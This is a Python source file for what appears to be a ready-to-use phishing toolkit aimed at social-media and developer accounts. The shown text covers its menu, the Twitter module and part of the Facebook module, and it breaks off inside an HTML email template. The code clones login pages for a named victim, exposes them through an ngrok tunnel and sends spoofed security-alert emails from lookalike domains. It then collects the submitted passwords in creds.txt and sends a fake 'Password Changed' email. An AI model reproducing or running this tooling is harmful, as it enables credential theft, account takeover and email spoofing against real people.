#!/usr/bin/python
# -*- coding: utf-8 -*-



# _\__o__ __o/       o         o           o           o__ __o     o         o/   o__ __o__/_   o__ __o
#      v    |/      <|>       <|>         <|>         /v     v\   <|>       /v   <|    v       <|     v\
#          /        < >       < >         / \        />       <\  / >      />    < >           / \     <\
#        o/          |         |        o/   \o    o/             \o__ __o/       |            \o/     o/
#       /v           o__/_ _\__o       <|__ __|>  <|               |__ __|        o__/_         |__  _<|
#      />            |         |       /       \   \\              |      \       |             |       \
#    o/             <o>       <o>    o/         \o   \         /  <o>      \o    <o>           <o>       \o
#   /v               |         |    /v           v\   o       o    |        v\    |             |         v\
#  />  _\o__/_      / \       / \  />             <\  <\__ __/>   / \        <\  / \  _\o__/_  / \         <\
#
#                                            {Follow Me Here}
#
# `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[Author: Z Hacker]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
#  `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[https://twitter.com/_DEF9]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
#   `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[https://www.youtube.com/c/ZhackerL]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`



import os
import codecs
import time
import subprocess
import requests
import datetime
import sys
import random
from pyvirtualdisplay import Display
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

##########################################

from data.main import *
from data.twitter import *
from data.facebook import *
from data.instagram import *
from data.google import *
from data.steam import *
from data.github import *

from data.smtp import *

##########################################

Green="\033[1;33m"
Blue="\033[1;34m"
Grey="\033[1;30m"
Reset="\033[0m"
Red="\033[1;31m"

##########################################

PORT = '80'

Phone = ''

Email_OS = ''
Email_time = ''
Email_from = ''
Email_ip = ''

##########################################

binary = FirefoxBinary('base/firefox/firefox')

##########################################

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################


# NOTE : WROTE THE MENU AND THE BANNER FUNCTION WHEN I WAS DRUNCC...
#        SO, I DECIDED TO ROLL WITH IT ANYWAYS..


def Menu():

	os.system("clear")

	print("            "+Blue+"@@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@  @@@  @@@")
	print("            "+Blue+"@@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@  @@@  @@@  @@@"  )
	print("            "+Blue+"@@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  @@!  !@@"  )
	print("            "+Blue+"!@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  !@!  @!!"  )
	print("            "+Blue+"@!@@!@!   @!@!@!@!  !!@  !!@@!!    @!@!@!@!   !@@!@! "  )
	print("            "+Blue+"!!@!!!    !!!@!!!!  !!!   !!@!!!   !!!@!!!!    @!!!  "  )
	print("            "+Blue+"!!:       !!:  !!!  !!:       !:!  !!:  !!!   !: :!! "  )
	print("            "+Blue+":!:       :!:  !:!  :!:      !:!   :!:  !:!  :!:  !:!"  )
	print("            "+Blue+" ::       ::   :::   ::  :::: ::   ::   :::   ::  :::"  )
	print("            "+Blue+" :         :   : :  :    :: : :     :   : :   :   :: "+Green+"V1.0")
	print("      "+Blue+"__________________________"+Grey+" ["+Reset+"Z-HACKER"+Grey+"]"+Blue+"____________________________")
	print("     "+Blue+"________________________"+Grey+"["+Red+"Pick Your Poison"+Grey+"]"+Blue+"__________________________"+Reset+"\n")
	print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Twitter"+Grey+"]")
	print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Facebook"+Grey+"]")
	print("     "+Grey+"["+Blue+"3"+Grey+"]-["+Green+"Instagram"+Grey+"]")
	print("     "+Grey+"["+Blue+"4"+Grey+"]-["+Green+"Google"+Grey+"]")
	print("     "+Grey+"["+Blue+"5"+Grey+"]-["+Green+"Steam"+Grey+"]")
	print("     "+Grey+"["+Blue+"6"+Grey+"]-["+Green+"Github"+Grey+"]\n")
	print("     "+"["+Blue+"0"+Grey+"]-["+Red+"Add"+Grey+"/"+Red+"Check SMTP"+Grey+"]-"+Grey+"-["+Blue+"99"+Grey+"]-["+Red+"Exit"+Grey+"]"+"\n")

	menu_options=int(input("     "+Grey+"$: "+Reset))

	if menu_options == 0:
		Menu.module = "ADDSMTP"

	elif menu_options == 1:
		Menu.module = "twitter"

	elif menu_options == 2:
		Menu.module = "facebook"

	elif menu_options == 3:
		Menu.module = "instagram"

	elif menu_options == 4:
		Menu.module = "google"

	elif menu_options == 5:
		Menu.module = "steam"

	elif menu_options == 6:
		Menu.module = "github"


	elif menu_options == 99:
		ENDst()

	else:
		Menu()

	Banner()



#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################



def Banner():

	os.system("reset")
	print("            "+Blue+"@@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@  @@@  @@@"  )
	print("            "+Blue+"@@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@  @@@  @@@  @@@"  )
	print("            "+Blue+"@@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  @@!  !@@"  )
	print("            "+Blue+"!@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  !@!  @!!"  )
	print("            "+Blue+"@!@@!@!   @!@!@!@!  !!@  !!@@!!    @!@!@!@!   !@@!@! "  )
	print("            "+Blue+"!!@!!!    !!!@!!!!  !!!   !!@!!!   !!!@!!!!    @!!!  "  )
	print("            "+Blue+"!!:       !!:  !!!  !!:       !:!  !!:  !!!   !: :!! "  )
	print("            "+Blue+":!:       :!:  !:!  :!:      !:!   :!:  !:!  :!:  !:!"  )
	print("            "+Blue+" ::       ::   :::   ::  :::: ::   ::   :::   ::  :::"  )
	print("            "+Blue+" :         :   : :  :    :: : :     :   : :   :   :: "+Green+"V1.0")
	print("      "+Blue+"__________________________"+Grey+" ["+Reset+"Z-HACKER"+Grey+"]"+Blue+"____________________________")
	print("     "+Blue+"___________________________"+Grey+" ["+Blue+Menu.module+Grey+"]"+Blue+"_____________________________"+Reset+"\n\n")

	if Menu.module == "ADDSMTP":
		ADDSMTP()

	elif Menu.module == "twitter":
		Twitter()

	elif Menu.module == "facebook":
		Facebook()

	elif Menu.module == "instagram":
		Instagram()

	elif Menu.module == "google":
		Google()

	elif Menu.module == "steam":
		Steam()

	elif Menu.module == "github":
		Github()



#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################


# FOR ADDING SMTP SERVERs

def ADDSMTP():

	os.system('clear')

	lawl = input(Green+"Do you want to "+Grey+"["+Blue+"A"+Grey+"]"+Blue+"DD " + Green + "or "+Grey+"["+Blue+"C"+Grey+"]"+Blue+"HECK, SMTP"+Grey+" ?- "+Reset)

	if lawl == "A":
		os.system('clear')
		SMTP_server = input(Grey+"["+Blue+"SERVER"+Grey+"]"+Green+": "+Reset)
		PORT = input(Grey+"["+Blue+"PORT"+Grey+"]"+Green+": "+Reset)
		USER = input(Grey+"["+Blue+"USER"+Grey+"]"+Green+": "+Reset)
		PASS = input(Grey+"["+Blue+"PASS"+Grey+"]"+Green+": "+Reset)
		filedata = str(Smtp_Template)

		filedata = filedata.replace('[SMTP]', str(SMTP_server))
		filedata = filedata.replace('[PORT]', str(PORT))
		filedata = filedata.replace('[USR]', str(USER))
		filedata = filedata.replace('[PWD]', str(PASS))

		with open('./data/smtp.py', 'w') as file:
		  file.write(filedata)
		input(Green+"[DONE]"+Reset+"  Press Any Key-")
		Menu()

	elif lawl == "C":
		os.system('reset')
		Email = input(Grey+"["+Blue+"Your-Email"+Grey+"]"+Green+": "+Reset)
		SPEmail = input(Grey+"["+Blue+"Spoofed-Email"+Grey+"]"+Green+": "+Reset)

		subprocess.call(['sendemail', '-f', str(SPEmail),'-t', str(Email), '-u', 'TEST', '-m', 'ITS WORKING!', '-s', smtps+":"+port, '-xu', username, '-xp', password])
		input(Green+"[Done]"+Reset+"  Press Any Key-")
		Menu()


	else:
		input(Red+"[WRONG-INPUT]"+Reset+"  Press Any Key-")
		ADDSMTP()



#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################


def Twitter():

	UNAME = input("     "+Grey+"["+Blue+"Username"+Grey+"]"+Green+": "+Red+"@"+Reset)


	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
	Email_try = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)

	if Email_try == 'N':
		Email_OS = input("     "+Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)
		Email_from = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)

	elif Email_try == 'y':
		Email_OS = str(random.choice(['Chrome on Linux','Firefox on Linux','Chrome on Android','Opera on Android','Chrome on IOS','Firefox on Windows']))
		Email_from = str(random.choice(['Iraq','Russia','Sweeden','France']))


	#PRINTS SHIT
	os.system('reset')
	print(Blue+"                     _________  ________                         ")
	print(Blue+"                    |\\___   ___\\\\   __  \\                        ")
	print(Blue+"                    \\|___ \\  \\_\\ \\  \\|\\  \\                       ")
	print(Blue+"                         \\ \\  \\ \\ \\   _  _\\                      ")
	print(Blue+"                          \\ \\  \\ \\ \\  \\\\  \\|                     ")
	print(Blue+"                           \\ \\__\\ \\ \\__\\\\ _\\                     ")
	print(Blue+"                            \\|__|  \\|__|\\|__|                    ")
	print(Blue+"                                                                    ")
	print(Blue+"                                                                     ")
	print(Blue+"                                                                     ")
	print(Blue+"                 ___  ___  ________  ________  ___  __       ")
	print(Blue+"                |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\     ")
	print(Blue+"                \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|_   ")
	print(Blue+"                 \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\  ")
	print(Blue+"                  \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ ")
	print(Blue+"                   \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\")
	print(Blue+"                    \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\n")
	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)


	# CLEARS OUR WEBSERVER DIR
	os.system('rm -r ./WEBSERVER/')
	os.system('mkdir ./WEBSERVER')
	os.system('touch ./WEBSERVER/creds.txt')
	# GETS USERS PFP
	profile_url = "https://twitter.com/"+UNAME
	profile_img_url = "https://twitter.com/"+UNAME+"/profile_image?size=original"

	subprocess.call(['xterm','-e','wget','-O','./WEBSERVER/VICTIM.jpg',profile_img_url])


	# MAKES AN INVISIBLE DISPLAY... AND RUNS SELENIUM WITH GECKO DRIVER

	display = Display(visible=0, size=(800, 600))
	display.start()

	br = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	time.sleep(2)
	br.get(profile_url)
	time.sleep(3)
	NAME = str(br.find_element_by_css_selector(".ProfileHeaderCard-nameLink").text)

	br.close()
	display.stop()

	# `~~~~~~~~~~~~~~~~~~~~~~~[WHERE THE MAGIC HAPPENS]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~` #


	filedata = str(INDEX_TWITTER)
	filedata = filedata.replace('DEF-9', str(NAME))
	filedata = filedata.replace('_DEF9', str(UNAME))

	with open('./WEBSERVER/index.html', 'w') as file:
	  file.write(filedata)



	filedata = str(MOBILE_TWITTER)
	filedata = filedata.replace('DEF-9', str(NAME))
	filedata = filedata.replace('_DEF9', str(UNAME))

	with open('./WEBSERVER/mobile.html', 'w') as file:
	  file.write(filedata)

	with open('./WEBSERVER/login.php', 'w') as file:
	  file.write(str(LOGIN_TWITTER))

	with open('./WEBSERVER/account_secured.html', 'w') as file:
	  file.write(str(SECURED_TWITTER))



	# `~~~~~~~~~~~~~~~~~~~~~~~[WHERE THE MAGIC ENDS]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~` #



	os.system('chmod -R 777 ./WEBSERVER/')


	# `------------[STARTS A WEBSERVER + FORWARDS PORT WITH NGROK]-------------` #

	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
	os.system("./ngrok http 80 > /dev/null &")


	# `PILE O SHIT BELOW...

	time.sleep(3)
	display = Display(visible=0, size=(800, 600))
	display.start()
	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	browser.get("http://localhost:4040/status")
	time.sleep(5)
	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
	browser.close()
	phishin_url = str(url_f)


	# `GENERATES EMAIL TEMPLATE

	emaildata = str(EMAIL1_TWITTER)
	emaildata = emaildata.replace('_DEF9', str(UNAME))
	emaildata = emaildata.replace('PHISHING_URL', str(phishin_url))
	emaildata = emaildata.replace('Chrome on Linux', str(Email_OS))
	emaildata = emaildata.replace('Iraq', str(Email_from))


	# `DECIDES THE SPOOFED EMAIL ADDRESS

	from_email = str(random.choice(['security@twittermails.com','no-reply@twittermails.com']))



	##################################
	#      SENDS SPOOFED EMAIL       #
	##################################


	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'New login to Twitter', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
	os.system('reset')



	##################################
	#       CHECKING FOR CREDS       #
	##################################


	banN()
	print("             \033[0;37m################################################")
	print("             #  \033[0mListening for Creds on UNAME:\033[0;94m"+str('@'+UNAME)+"\033[0;37m   #")
	print("             ################################################\033[0;93m")
	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")

	os.system("tail -f ./WEBSERVER/creds.txt")

	# `CLEANS UP - Teh MESS IT CAUSED
	print("\n                 \033[0;34m######################################")
	print("                 #              --DONE--              #")
	print("                 ######################################")
	os.system("pkill -9 ngrok")
	os.system("pkill -9 php")

	print("                             one last step!!\n")

	# `SENDS A CONFIRMATION EMAIL -
	Email_OS=input(Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)
	Email_from=input(Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)
	emaildata = str(EMAIL2_TWITTER)
	emaildata = emaildata.replace('_DEF9', str(UNAME))
	emaildata = emaildata.replace('Chrome on Linux', str(Email_OS))
	emaildata = emaildata.replace('Iraq', str(Email_from))
	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Password Changed', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])

	os.system('reset')
	ENDst()

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################




def Facebook():

	ID = input("     "+Grey+"["+Blue+"ID"+Grey+"]"+Green+": "+Reset)
	full_name = input("     "+Grey+"["+Blue+"Name"+Grey+"]"+Green+": "+Reset)

	Phone_try = input("     "+Grey+"["+Blue+"Have targets Phone number"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)

	if Phone_try == "N":
		Phone = "NoPhone"
	elif Phone_try == "y":
		Phone = input("     "+Grey+"["+Blue+"Phone"+Grey+"]"+Green+": "+Reset)


	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
	Email_try = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)

	if Email_try == 'N':
		Email_OS = input("     "+Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)
		Email_time = input("     "+Grey+"["+Blue+"Time"+Grey+"]"+Green+": "+Reset)
		Email_from = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)
		Email_ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset)

	elif Email_try == 'y':
		Email_OS = random.choice(['Windows 8','Windows 7','Windows 10','Unknown','Linux','Android 6.0','Android 5.0','Android 4.0','ios 10.1','Mac OSX'])
		Email_time = str(random.choice(['3:14','4:36','9:04','21:43','14:32','1:13','2:23','16:56','10:34'])) + " GMT"
		Email_from = "North Palm Beach, USA"
		Email_ip = random.choice([
			"104.131.141.114",
			"104.131.206.23",
			"104.131.245.55",
			"104.131.4.237",
			"104.131.65.225",
			"104.156.224.83",
			"104.163.133.75",
			"104.167.123.52",
			"104.168.53.37",
			"104.168.57.75",
			"104.169.47.152",
			"104.191.31.69",
			"104.192.102.156",
			"104.194.157.151",
			"104.199.115.227",
			"104.206.237.23",
			"104.209.44.248",
			"104.215.23.88",
			"104.218.63.72",
			"104.218.63.73"])



	first_name = full_name.strip().split(" ",1)[0]


	phone_w=open('sms_support/phone','w')
	phone_w.write(str(Phone+":"+first_name))
	phone_w.close()


	os.system("reset")
	print(Blue+"\n         ________ ________  ________  _______               ")
	print(Blue+"        |\\  _____\\\\   __  \\|\\   ____\\|\\  ___ \\              ")
	print(Blue+"        \\ \\  \\__/\\ \\  \\|\\  \\ \\  \\___|\\ \\   __/|             ")
	print(Blue+"         \\ \\   __\\\\ \\   __  \\ \\  \\    \\ \\  \\_|/__           ")
	print(Blue+"          \\ \\  \\_| \\ \\  \\ \\  \\ \\  \\____\\ \\  \\_|\\ \\ ------+ ")
	print(Blue+"           \\ \\__\\   \\ \\__\\ \\__\\ \\_______\\ \\_______\\       \\  ")
	print(Blue+"            \\|__|    \\|__|\\|__|\\|_______|\\|_______|        \\ ")
	print(Blue+"                                                            \\")
	print(Blue+"                                                             \\----\\Z\\")
	print(Blue+"                                                              \\")
	print(Blue+"                ___  ___  ________  ________  ___  __          \\")
	print(Blue+"               |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\         \\   ")
	print(Blue+"               \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|_        \\")
	print(Blue+"                \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\--------+")
	print(Blue+"                 \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ ")
	print(Blue+"                  \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\")
	print(Blue+"                   \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|"+Green+"V1.2\n")
	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)

	pic = str("https://graph.facebook.com/"+str(ID)+"/picture")




	os.system("rm -r WEBSERVER/")
	os.system("mkdir WEBSERVER")



	filedata = str(Main_Facebook)

	filedata = filedata.replace('[PIC]', str(pic))
	filedata = filedata.replace('[FIRSTNAME]', str(first_name))

	with open('./WEBSERVER/index.html', 'w') as file:
	  file.write(filedata)

	filedata = str(Mobile_Facebook)
	mobile = open('./WEBSERVER/i_mobile.html', 'w')
	mobile.write(filedata)
	mobile.close()

	filedata = str(Login_Facebook)
	login = open('./WEBSERVER/login.php', 'w')
	login.write(filedata)
	login.close()

	filedata = str(Secured_Facebook)
	secured = open('./WEBSERVER/account_secured.html', 'w')
	secured.write(filedata)
	secured.close()

	os.system("touch ./WEBSERVER/creds.txt")
	os.system("chmod -R 777 WEBSERVER/")






	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
	os.system("./ngrok http 80 > /dev/null &")

	time.sleep(3)

	display = Display(visible=0, size=(800, 600))
	display.start()


	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	browser.get("http://localhost:4040/status")

	time.sleep(5)

	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
	browser.close()
	phishin_url = str(url_f)



	###################################
	#    SENDING THE SPOOFED EMAIL    #
	###################################


	email_body_html=("""<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><head>\n    <!--[if gte mso 9]><xml>\n     <o:OfficeDocumentSettings>\n      <o:AllowPNG/>\n      <o:PixelsPerInch>96</o:PixelsPerInch>\n     </o:OfficeDocumentSettings>\n    </xml><![endif]-->\n    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">\n    <meta name="viewport" content="width=device-width">\n    <!--[if !mso]><!--><meta http-equiv="X-UA-Compatible" content="IE=edge"><!--<![endif]-->\n    <title></title>\n    \n    \n    <style type="text/css" id="media-query">\n      body {\n  margin: 0;\n  padding: 0; }\n\ntable, tr, td {\n  vertical-align: top;\n  border-collapse: collapse; }\n\n.ie-browser table, .mso-container table {\n  table-layout: fixed; }\n\n* {\n  line-height: inherit; }\n\na[x-apple-data-detectors=true] {\n  color: inherit !important;\n  text-decoration: none !important; }\n\n[owa] .img-container div, [owa] .img-container button {\n  display: block !important; }\n\n[owa] .fullwidth button {\n  width: 100% !important; }\n\n[owa] .block-grid .col {\n  display: table-cell;\n  float: none !important;\n  vertical-align: top; }\n\n.ie-browser .num12, .ie-browser .block-grid, [owa] .num12, [owa] .block-grid {\n  width: 480px !important; }\n\n.ExternalClass, .ExternalClass p, .ExternalClass span, .ExternalClass font, .ExternalClass td, .ExternalClass div {\n  line-height: 100%; }\n\n.ie-browser .mixed-two-up .num4, [owa] .mixed-two-up .num4 {\n  width: 160px !important; }\n\n.ie-browser .mixed-two-up .num8, [owa] .mixed-two-up .num8 {\n  width: 320px !important; }\n\n.ie-browser .block-grid.two-up .col, [owa] .block-grid.two-up .col {\n  width: 240px !important; }\n\n.ie-browser .block-grid.three-up .col, [owa] .block-grid.three-up .col {\n  width: 160px !important; }\n\n.ie-browser .block-grid.four-up .col, [owa] .block-grid.four-up .col {\n  width: 120px !important; }\n\n.ie-browser .block-grid.five-up .col, [owa] .block-grid.five-up .col {\n  width: 96px !important; }\n\n.ie-browser .block-grid.six-up .col, [owa] .block-grid.six-up .col {\n  width: 80px !important; }\n\n.ie-browser .block-grid.seven-up .col, [owa] .block-grid.seven-up .col {\n  width: 68px !important; }\n\n.ie-browser .block-grid.eight-up .col, [owa] .block-grid.eight-up .col {\n  width: 60px !important; }\n\n.ie-browser .block-grid.nine-up .col, [owa] .block-grid.nine-up .col {\n  width: 53px !important; }\n\n.ie-browser .block-grid.ten-up .col, [owa] .block-grid.ten-up .col {\n  width: 48px !important; }\n\n.ie-browser .block-grid.eleven-up .col, [owa] .block-grid.eleven-up .col {\n  width: 43px !important; }\n\n.ie-browser .block-grid.twelve-up .col, [owa] .block-grid.twelve-up .col {\n  width: 40px !important; }\n@media only screen and (min-width: 500px) {"""+"""\n  .block-grid {\n    width: 480px !important; }\n  .block-grid .col {\n    vertical-align: top; }\n    .block-grid .col.num12 {\n      width: 480px !important; }\n  .block-grid.mixed-two-up .col.num4 {\n    width: 160px !important; }\n  .block-grid.mixed-two-up .col.num8 {\n    width: 320px !important; }\n  .block-grid.two-up .col {\n    width: 240px !important; }\n  .block-grid.three-up .col {\n    width: 160px !important; }\n  .block-grid.four-up .col {\n    width: 120px !important; }\n  .block-grid.five-up .col {\n    width: 96px !important; }\n  .block-grid.six-up .col {\n    width: 80px !important; }\n  .block-grid.seven-up .col {\n    width: 68px !important; }\n  .block-grid.eight-up .col {\n    width: 60px !important; }\n  .block-grid.nine-up .col {\n    width: 53px !important; }\n  .block-grid.ten-up .col {\n    width: 48px !important; }\n  .block-grid.eleven-up .col {\n    width: 43px !important; }\n  .block-grid.twelve-up .col {\n    width: 40px !important; } }\n@media (max-width: 500px) {\n  .block-grid, .col {\n    min-width: 320px !important;\n    max-width: 100% !important;\n    display: block !important; }\n  .block-grid {\n    width: calc(100% - 40px) !important; }\n  .col {\n    width: 100% !important; }\n    .col > div {\n      margin: 0 auto; }\n  img.fullwidth, img.fullwidthOnMobile {\n    max-width: 100% !important; }\n  .no-stack .col {\n    min-width: 0 !important;\n    display: table-cell !important; }\n  .no-stack.two-up .col {\n    width: 50% !important; }\n  .no-stack.mixed-two-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.mixed-two-up .col.num8 {\n    width: 66% !important; }\n  .no-stack.three-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.four-up .col.num3 {\n    width: 25% !important; } }\n\n    </style>\n</head>\n<body class="clean-body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #FAF7F7">\n  <style type="text/css" id="media-query-bodytag">\n    @media (max-width: 520px) {\n      .block-grid {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n      .col {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n        .col > div {\n          margin: 0 auto;\n        }\n      img.fullwidth {\n        max-width: 100%!important;\n      }\n			img.fullwidthOnMobile {\n        max-width: 100%!important;\n      }\n      .no-stack .col {\n				min-width: 0!important;\n				display: table-cell!important;\n			}\n			.no-stack.two-up .col {\n				width: 50%!important;\n			}\n			.no-stack.mixed-two-up .col.num4 {\n				width: 33%!important;\n			}\n			.no-stack.mixed-two-up .col.num8 {\n				width: 66%!important;\n			}\n			.no-stack.three-up .col.num4 {\n				width: 33%!important\n			}\n			.no-stack.four-up .col.num3 {\n				width: 25%!important\n			}\n    }\n  </style>\n  <!--[if IE]><div class="ie-browser"><![endif]-->\n  <!--[if mso]><div class="mso-container"><![endif]-->\n  <table class="nl-container" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #FAF7F7;width: 100%" cellpadding="0" cellspacing="0">\n	<tbody>\n	<tr style="vertical-align: top">\n		<td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top">\n    <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="background-color: #FAF7F7;"><![endif]-->\n    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid mixed-two-up ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="160" style=" width:160px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num4" style="display: table-cell;vertical-align: top;max-width: 320px;min-width: 160px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <div align="center" class="img-container center fixedwidth" style="padding-right: 0px;  padding-left: 0px;">\n<!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 0px; padding-left: 0px;" align="center"><![endif]-->\n  <img class="center fixedwidth" align="center" border="0" src="https://proxy.duckduckgo.com/iu/?u=http://pngimg.com/uploads/facebook_logos/facebook_logos_PNG19748.png&f=1" alt="Image" title="Image" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: block !important;border: 0;height: auto;float: none;width: 100%;max-width: 80px" width="80">\n<!--[if mso]></td></tr></table><![endif]-->\n</div>\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if 